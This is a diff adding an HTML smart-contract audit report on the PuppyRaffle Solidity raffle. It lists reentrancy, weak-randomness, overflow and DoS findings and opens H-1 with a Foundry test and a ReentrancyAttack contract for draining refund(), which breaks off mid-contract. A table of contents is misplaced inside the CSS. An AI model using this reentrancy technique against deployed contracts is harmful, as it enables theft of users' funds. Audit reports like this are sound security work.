@@ -1,0 +1,962 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="author" content="0xKowalski">
+    <title>PuppyRaffle Security Review</title>
+    
+    <style>
+        body {
+            font-family: 'Helvetica', 'Arial', sans-serif;
+        }
+
+        header {
+            text-align: center;
+        }
+        
+        nav, header {
+            page-break-after: always;
+        }
+
+        header h1, header h2, header p {
+            margin: 0;
+            padding: 20px 0;
+        }
+
+        pre {
+            font-family: monospace;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        nav {
+            font-size: 16px;
+        }
+
+        @media print {
+            nav, <ul>
+<li><a href="#introduction" id="toc-introduction">Introduction</a>
+<ul>
+<li><a href="#about-0xkowalski" id="toc-about-0xkowalski">About
+0xKowalski</a></li>
+<li><a href="#disclaimer" id="toc-disclaimer">Disclaimer</a></li>
+</ul></li>
+<li><a href="#risk-classification" id="toc-risk-classification">Risk
+Classification</a>
+<ul>
+<li><a href="#overview" id="toc-overview">Overview</a></li>
+<li><a href="#severity-levels" id="toc-severity-levels">Severity
+Levels</a></li>
+</ul></li>
+<li><a href="#protocol-summary" id="toc-protocol-summary">Protocol
+Summary</a>
+<ul>
+<li><a href="#overview-1" id="toc-overview-1">Overview</a></li>
+<li><a href="#scope" id="toc-scope">Scope</a></li>
+<li><a href="#issues-found" id="toc-issues-found">Issues found</a></li>
+</ul></li>
+<li><a href="#findings" id="toc-findings">Findings</a>
+<ul>
+<li><a href="#high-severity-findings"
+id="toc-high-severity-findings">High Severity Findings</a>
+<ul>
+<li><a
+href="#h-1-reentrancy-in-refund-allows-malicious-users-to-drain-the-contracts-funds"
+id="toc-h-1-reentrancy-in-refund-allows-malicious-users-to-drain-the-contracts-funds">[H-1]
+Reentrancy in <code>refund()</code> allows malicious users to drain the
+contracts funds</a></li>
+<li><a href="#h-2-weak-randomness-in-selectwinner-is-exploitable"
+id="toc-h-2-weak-randomness-in-selectwinner-is-exploitable">[H-2] Weak
+randomness in <code>selectWinner()</code> is exploitable</a></li>
+<li><a href="#h-3-integer-overflow-of-totalfees-loses-fees"
+id="toc-h-3-integer-overflow-of-totalfees-loses-fees">[H-3] Integer
+overflow of <code>totalFees</code> loses fees</a></li>
+</ul></li>
+<li><a href="#medium-severity-findings"
+id="toc-medium-severity-findings">Medium Severity Findings</a>
+<ul>
+<li><a
+href="#m-1-nested-loop-inside-enterraffle-create-a-dos-vulnerability"
+id="toc-m-1-nested-loop-inside-enterraffle-create-a-dos-vulnerability">[M-1]
+Nested loop inside <code>enterRaffle()</code> create a DoS
+vulnerability</a></li>
+<li><a
+href="#m-2-smart-contract-wallets-without-a-recieve-function-will-revert-if-they-win-the-raffle"
+id="toc-m-2-smart-contract-wallets-without-a-recieve-function-will-revert-if-they-win-the-raffle">[M-2]
+Smart contract wallets without a <code>recieve</code> function will
+revert if they win the raffle</a></li>
+</ul></li>
+<li><a href="#low-severity-findings" id="toc-low-severity-findings">Low
+Severity Findings</a>
+<ul>
+<li><a
+href="#l-1-getactiveplayerindex-returns-0-when-player-is-not-active-despite-0-being-a-valid-player-index"
+id="toc-l-1-getactiveplayerindex-returns-0-when-player-is-not-active-despite-0-being-a-valid-player-index">[L-1]
+<code>getActivePlayerIndex()</code> returns <code>0</code> when player
+is not active, despite <code>0</code> being a valid player
+index</a></li>
+</ul></li>
+<li><a href="#informational-findings"
+id="toc-informational-findings">Informational Findings</a>
+<ul>
+<li><a href="#i-1-solidity-pragma-should-be-specific"
+id="toc-i-1-solidity-pragma-should-be-specific">[I-1] Solidity pragma
+should be specific</a></li>
+<li><a href="#i-2-solidity-pragma-should-be-a-modern-version"
+id="toc-i-2-solidity-pragma-should-be-a-modern-version">[I-2] Solidity
+pragma should be a modern version</a></li>
+<li><a
+href="#i-3-missing-checks-for-address0-when-assigning-values-to-address-state-variables"
+id="toc-i-3-missing-checks-for-address0-when-assigning-values-to-address-state-variables">[I-3]
+Missing Checks for <code>address(0)</code> when assigning values to
+address state variables</a></li>
+<li><a href="#i-4-selectwinner-does-not-follow-cei"
+id="toc-i-4-selectwinner-does-not-follow-cei">[I-4]
+<code>selectWinner()</code> does not follow CEI</a></li>
+<li><a href="#i-5-use-of-magic-numbers-is-discouraged"
+id="toc-i-5-use-of-magic-numbers-is-discouraged">[I-5] Use of “magic”
+numbers is discouraged</a></li>
+</ul></li>
+<li><a href="#gas-optimization-findings"
+id="toc-gas-optimization-findings">Gas Optimization Findings</a>
+<ul>
+<li><a
+href="#g-1-unchanged-state-variables-should-be-declared-constant-or-immutable"
+id="toc-g-1-unchanged-state-variables-should-be-declared-constant-or-immutable">[G-1]
+Unchanged state variables should be declared constant or
+immutable</a></li>
+<li><a href="#g-2-storage-variables-in-a-loop-should-be-cached"
+id="toc-g-2-storage-variables-in-a-loop-should-be-cached">[G-2] Storage
+variables in a loop should be cached</a></li>
+</ul></li>
+</ul></li>
+</ul> {
+                page-break-before: always;
+            }
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        th, td {
+            border: 1px solid #000;
+            padding: 8px;
+        }
+
+        th {
+            background-color: #f2f2f2;
+            text-align: left;
+            font-weight: bold;
+        }
+        
+
+    </style>
+</head>
+<body>
+    <header>
+        <pre>
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⣤⣤⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣶⡿⠟⠛⠛⠉⠁⠀⠀⠈⠉⠙⠛⠻⢿⣷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠟⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠹⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠁⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣹⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⢀⣶⡿⠟⠉⠉⠉⠉⠉⠛⢿⣶⣄⠀⠀⠀⠀⠀⠀⠀⣴⡿⠛⠉⠉⠻⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⠀⠀⣰⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣦⠀⠀⠀⠀⠀⢰⣿⠃⠀⠀⠀⠀⠸⣿⡆⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⢠⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⣀⣀⣤⣄⣺⣧⠀⢠⣤⣶⣤⡀⢻⣿⡀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⣿⠇⠀⠀⠀⠀⠀⠀⢰⣾⢻⣿⣦⠀⠀⣼⡿⠟⠛⠉⠙⠛⢿⣦⡸⣶⣿⣿⠃⠀⣿⣷⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⠟⠀⣼⣿⣀⠀⠀⠀⠀⠀⣀⣹⣷⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠈⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣛⡳⠶⣖⣻⣿⡿⠃⠀⠀⠀⢀⣼⣿⣿⠁⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⠀⠀⠀⠀⠻⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠛⠛⠋⠁⠀⠀⠀⠀⣠⣾⠏⢻⣧⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠇⠀⠀⠀⠀⠀⠀⠻⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣧⣄⠈⢿⣆⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠀⠉⠻⣷⡈⢿⣷⣄⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣠⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⣿⣿⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣆⠙⢿⣦⡀⠀
+⠀⠀⠀⠀⠀⠀⣰⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣾⡟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠂⠀⢻⣷⡄
+⠀⠀⠀⠀⠀⣰⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⢿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠃⠀⠀⠀⢹⡇
+⠀⠀⠀⠀⢰⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠇⠀⠀⠀⠀⢸⣿
+⠀⠀⠀⠀⣾⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠀⠀⠀⠀⠀⣾⡏
+⠀⠀⠀⢰⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⣄⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⣰⣿⠁
+⠀⠀⠀⢸⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⣰⣿⠃⠀
+⠀⠀⢀⣼⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⣀⣴⣾⡟⠁⠀⠀
+⢀⣴⣿⠟⢿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠇⠙⠿⣷⣄⡀⠀⠀⠀⠀⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⠛⢻⣿⠁⠀⠀⠀
+⢸⣿⠁⠀⠸⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠀⠀⠀⠈⠻⢷⣦⣄⣀⣸⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⢿⣦⠀⠀⠀
+⠸⣿⣷⡀⠀⠹⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣨⣿⣄⠀⠀⠀⠀⠀⠉⠉⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⠃⢸⣿⣤⣤⠀
+⠀⠈⠛⠿⣷⣤⣝⣿⣦⡀⠀⠀⠀⢀⡀⢠⣾⡿⠛⠻⣿⣆⣴⡾⣶⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠁⠀⠛⠛⢹⣿⠀
+⠀⠀⠀⠀⠀⠉⠉⠛⠻⢿⣷⣄⠀⣿⡿⢿⡟⠀⠀⠀⠸⠿⠏⠀⠀⢹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠋⠀⠀⠀⣀⣴⡿⠋⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⠋⠀⣀⣤⣴⡿⠟⠋⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣄⠀⠀⠀⠀⠀⠀⠀⣠⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⠟⠛⠻⠿⠟⠛⠋⠁⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣦⣄⣀⣀⣠⣾⣿⣧⣤⣤⣤⣤⣤⣤⣤⣴⣶⠶⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠉⠉⠀⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+
+        </pre>
+
+        <h1>PuppyRaffle Security Review</h1>
+        <h2>Review completed by 0xKowalski</h2>
+        <p>2024-03-24</p>
+    </header>
+
+        <nav>
+        <h1>Table of Contents</h1>
+        <ul>
+        <li><a href="#introduction"
+        id="toc-introduction">Introduction</a>
+        <ul>
+        <li><a href="#about-0xkowalski" id="toc-about-0xkowalski">About
+        0xKowalski</a></li>
+        <li><a href="#disclaimer"
+        id="toc-disclaimer">Disclaimer</a></li>
+        </ul></li>
+        <li><a href="#risk-classification"
+        id="toc-risk-classification">Risk Classification</a>
+        <ul>
+        <li><a href="#overview" id="toc-overview">Overview</a></li>
+        <li><a href="#severity-levels" id="toc-severity-levels">Severity
+        Levels</a></li>
+        </ul></li>
+        <li><a href="#protocol-summary"
+        id="toc-protocol-summary">Protocol Summary</a>
+        <ul>
+        <li><a href="#overview-1" id="toc-overview-1">Overview</a></li>
+        <li><a href="#scope" id="toc-scope">Scope</a></li>
+        <li><a href="#issues-found" id="toc-issues-found">Issues
+        found</a></li>
+        </ul></li>
+        <li><a href="#findings" id="toc-findings">Findings</a>
+        <ul>
+        <li><a href="#high-severity-findings"
+        id="toc-high-severity-findings">High Severity Findings</a>
+        <ul>
+        <li><a
+        href="#h-1-reentrancy-in-refund-allows-malicious-users-to-drain-the-contracts-funds"
+        id="toc-h-1-reentrancy-in-refund-allows-malicious-users-to-drain-the-contracts-funds">[H-1]
+        Reentrancy in <code>refund()</code> allows malicious users to
+        drain the contracts funds</a></li>
+        <li><a
+        href="#h-2-weak-randomness-in-selectwinner-is-exploitable"
+        id="toc-h-2-weak-randomness-in-selectwinner-is-exploitable">[H-2]
+        Weak randomness in <code>selectWinner()</code> is
+        exploitable</a></li>
+        <li><a href="#h-3-integer-overflow-of-totalfees-loses-fees"
+        id="toc-h-3-integer-overflow-of-totalfees-loses-fees">[H-3]
+        Integer overflow of <code>totalFees</code> loses fees</a></li>
+        </ul></li>
+        <li><a href="#medium-severity-findings"
+        id="toc-medium-severity-findings">Medium Severity Findings</a>
+        <ul>
+        <li><a
+        href="#m-1-nested-loop-inside-enterraffle-create-a-dos-vulnerability"
+        id="toc-m-1-nested-loop-inside-enterraffle-create-a-dos-vulnerability">[M-1]
+        Nested loop inside <code>enterRaffle()</code> create a DoS
+        vulnerability</a></li>
+        <li><a
+        href="#m-2-smart-contract-wallets-without-a-recieve-function-will-revert-if-they-win-the-raffle"
+        id="toc-m-2-smart-contract-wallets-without-a-recieve-function-will-revert-if-they-win-the-raffle">[M-2]
+        Smart contract wallets without a <code>recieve</code> function
+        will revert if they win the raffle</a></li>
+        </ul></li>
+        <li><a href="#low-severity-findings"
+        id="toc-low-severity-findings">Low Severity Findings</a>
+        <ul>
+        <li><a
+        href="#l-1-getactiveplayerindex-returns-0-when-player-is-not-active-despite-0-being-a-valid-player-index"
+        id="toc-l-1-getactiveplayerindex-returns-0-when-player-is-not-active-despite-0-being-a-valid-player-index">[L-1]
+        <code>getActivePlayerIndex()</code> returns <code>0</code> when
+        player is not active, despite <code>0</code> being a valid
+        player index</a></li>
+        </ul></li>
+        <li><a href="#informational-findings"
+        id="toc-informational-findings">Informational Findings</a>
+        <ul>
+        <li><a href="#i-1-solidity-pragma-should-be-specific"
+        id="toc-i-1-solidity-pragma-should-be-specific">[I-1] Solidity
+        pragma should be specific</a></li>
+        <li><a href="#i-2-solidity-pragma-should-be-a-modern-version"
+        id="toc-i-2-solidity-pragma-should-be-a-modern-version">[I-2]
+        Solidity pragma should be a modern version</a></li>
+        <li><a
+        href="#i-3-missing-checks-for-address0-when-assigning-values-to-address-state-variables"
+        id="toc-i-3-missing-checks-for-address0-when-assigning-values-to-address-state-variables">[I-3]
+        Missing Checks for <code>address(0)</code> when assigning values
+        to address state variables</a></li>
+        <li><a href="#i-4-selectwinner-does-not-follow-cei"
+        id="toc-i-4-selectwinner-does-not-follow-cei">[I-4]
+        <code>selectWinner()</code> does not follow CEI</a></li>
+        <li><a href="#i-5-use-of-magic-numbers-is-discouraged"
+        id="toc-i-5-use-of-magic-numbers-is-discouraged">[I-5] Use of
+        “magic” numbers is discouraged</a></li>
+        </ul></li>
+        <li><a href="#gas-optimization-findings"
+        id="toc-gas-optimization-findings">Gas Optimization Findings</a>
+        <ul>
+        <li><a
+        href="#g-1-unchanged-state-variables-should-be-declared-constant-or-immutable"
+        id="toc-g-1-unchanged-state-variables-should-be-declared-constant-or-immutable">[G-1]
+        Unchanged state variables should be declared constant or
+        immutable</a></li>
+        <li><a href="#g-2-storage-variables-in-a-loop-should-be-cached"
+        id="toc-g-2-storage-variables-in-a-loop-should-be-cached">[G-2]
+        Storage variables in a loop should be cached</a></li>
+        </ul></li>
+        </ul></li>
+        </ul>
+    </nav>
+        <h2 id="introduction">Introduction</h2>
+        <h3 id="about-0xkowalski">About 0xKowalski</h3>
+        <p>I am 0xKowalski, a specialized Web3 security researcher with
+        a focus on identifying and mitigating vulnerabilities in
+        decentralized applications. With extensive experience in
+        blockchain technology, my work encompasses the analysis of smart
+        contracts, protocols, and DeFi platforms to enhance their
+        security posture. My professional commitment is to safeguard the
+        Web3 ecosystem, ensuring its integrity and reliability for users
+        and stakeholders.</p>
+        <p>You can find me at: - <a
+        href="https://x.com/0xKowalski_">X</a> - <a
+        href="https://github.com/0xKowalski1">Github</a></p>
+        <h3 id="disclaimer">Disclaimer</h3>
+        <p>I have exerted every effort to identify as many
+        vulnerabilities as possible within the allocated time period.
+        However, I do not bear responsibility for the findings detailed
+        in this document. It’s important to note that a security audit
+        does not serve as an endorsement of the underlying protocol.
+        This audit was conducted within a specific timeframe, and the
+        review focused exclusively on the security features of the
+        Solidity implementation of the contracts.</p>
+        <h2 id="risk-classification">Risk Classification</h2>
+        <h3 id="overview">Overview</h3>
+        <p>Risk classification for Web3 security findings involves
+        evaluating the potential impact and likelihood of each
+        vulnerability. This process helps in prioritizing responses
+        based on the severity of the risk posed to the system.</p>
+        <h3 id="severity-levels">Severity Levels</h3>
+        <p>The severity of a finding is determined by assessing its
+        impact and likelihood:</p>
+        <table>
+        <thead>
+        <tr class="header">
+        <th></th>
+        <th></th>
+        <th>Impact</th>
+        <th></th>
+        <th></th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr class="odd">
+        <td></td>
+        <td></td>
+        <td>High</td>
+        <td>Medium</td>
+        <td>Low</td>
+        </tr>
+        <tr class="even">
+        <td></td>
+        <td>High</td>
+        <td>H</td>
+        <td>H/M</td>
+        <td>M</td>
+        </tr>
+        <tr class="odd">
+        <td>Likelihood</td>
+        <td>Medium</td>
+        <td>H/M</td>
+        <td>M</td>
+        <td>M/L</td>
+        </tr>
+        <tr class="even">
+        <td></td>
+        <td>Low</td>
+        <td>M</td>
+        <td>M/L</td>
+        <td>L</td>
+        </tr>
+        </tbody>
+        </table>
+        <p>The combination of impact and likelihood helps in assigning a
+        precise severity level to each finding, ensuring that the most
+        serious vulnerabilities are prioritized and addressed swiftly to
+        maintain the integrity and security of the system.</p>
+        <p>Additionally, informational findings may be noted in this
+        report to shed light on non-critical issues or good practices.
+        They offer context and detail that can help improve system
+        understanding and security posture, even though they don’t
+        represent immediate threats.</p>
+        <h2 id="protocol-summary">Protocol Summary</h2>
+        <h3 id="overview-1">Overview</h3>
+        <p>Puppy Raffle is a on chain raffle where users can pay a fee
+        to join a raffle with a chance to win a cute dog NFT.</p>
+        <h3 id="scope">Scope</h3>
+        <table>
+        <thead>
+        <tr class="header">
+        <th>Files</th>
+        <th>nSloc</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr class="odd">
+        <td><code>src/PuppyRaffle.sol</code></td>
+        <td>143</td>
+        </tr>
+        </tbody>
+        </table>
+        <h3 id="issues-found">Issues found</h3>
+        <table>
+        <thead>
+        <tr class="header">
+        <th>Severity Level</th>
+        <th>Number of Findings</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr class="odd">
+        <td>High</td>
+        <td>3</td>
+        </tr>
+        <tr class="even">
+        <td>Medium</td>
+        <td>2</td>
+        </tr>
+        <tr class="odd">
+        <td>Low</td>
+        <td>1</td>
+        </tr>
+        <tr class="even">
+        <td>Informational</td>
+        <td>5</td>
+        </tr>
+        <tr class="odd">
+        <td>Gas</td>
+        <td>2</td>
+        </tr>
+        </tbody>
+        </table>
+        <h2 id="findings">Findings</h2>
+        <h3 id="high-severity-findings">High Severity Findings</h3>
+        <h4
+        id="h-1-reentrancy-in-refund-allows-malicious-users-to-drain-the-contracts-funds">[H-1]
+        Reentrancy in <code>refund()</code> allows malicious users to
+        drain the contracts funds</h4>
+        <p><strong>Description</strong> The function
+        <code>refund()</code> does not follow the check effects
+        interactions pattern. It refunds the player, and then removes
+        the player from the <code>players</code> array. This allows
+        malicious users to enter a smart contract that reenters the
+        refund function on the receive callback, allowing them to drain
+        the funds of the contract.</p>
+        <p><strong>Impact</strong> This allows malicious users to
+        completely drain the contract of funds.</p>
+        <p><strong>Proof of Concept</strong> To prove this issue, I have
+        written a test to be added to the
+        <code>test/PuppyRaffleTest.t.sol</code> file, this test includes
+        a <code>ReentrancyAttack</code> contract. To run these tests add
+        the following to the test file:</p>
+        <div class="sourceCode" id="cb1"><pre
+        class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>    <span class="kw">function</span> <span class="fu">testReenterRefund</span>() <span class="kw">public</span>{</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">startPrank</span>(vm<span class="op">.</span><span class="fu">addr</span>(<span class="dv">1</span>))<span class="op">;</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">deal</span>(vm<span class="op">.</span><span class="fu">addr</span>(<span class="dv">1</span>)<span class="op">,</span> entranceFee)<span class="op">;</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>        address[] memory players <span class="op">=</span> <span class="kw">new</span> address[](<span class="dv">1</span>)<span class="op">;</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>        players[<span class="dv">0</span>] <span class="op">=</span> vm<span class="op">.</span><span class="fu">addr</span>(<span class="dv">1</span>)<span class="op">;</span></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="at">enterRaffle</span>{<span class="dt">value</span><span class="op">:</span>entranceFee}(players)<span class="op">;</span></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">stopPrank</span>()<span class="op">;</span></span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">startPrank</span>(vm<span class="op">.</span><span class="fu">addr</span>(<span class="dv">10</span>))<span class="op">;</span></span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">deal</span>(vm<span class="op">.</span><span class="fu">addr</span>(<span class="dv">10</span>)<span class="op">,</span> entranceFee)<span class="op">;</span></span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a>        ReentrancyAttack reentrancyAttack <span class="op">=</span> <span class="kw">new</span> <span class="fu">ReentrancyAttack</span>(<span class="fu">address</span>(puppyRaffle))<span class="op">;</span></span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a>        players[<span class="dv">0</span>] <span class="op">=</span> <span class="fu">address</span>(reentrancyAttack)<span class="op">;</span></span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="at">enterRaffle</span>{<span class="dt">value</span><span class="op">:</span>entranceFee}(players)<span class="op">;</span></span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">expectRevert</span>()<span class="op">;</span></span>
+<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a>        reentrancyAttack<span class="op">.</span><span class="fu">refund</span>(<span class="dv">1</span>)<span class="op">;</span> <span class="co">// Refund attack should revert</span></span>
+<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a>    }</span></code></pre></div>
+        <p>Additionally, add the <code>ReentrnacyAttack</code> contract
+        to the test file, outside of the main test contract.</p>
+        <div class="sourceCode" id="cb2"><pre
+        class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a>contract ReentrancyAttack{</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>    PuppyRaffle puppyRaffle<span class="op">;</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>    uint256 playerIndex<span class="op">;</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a></span>
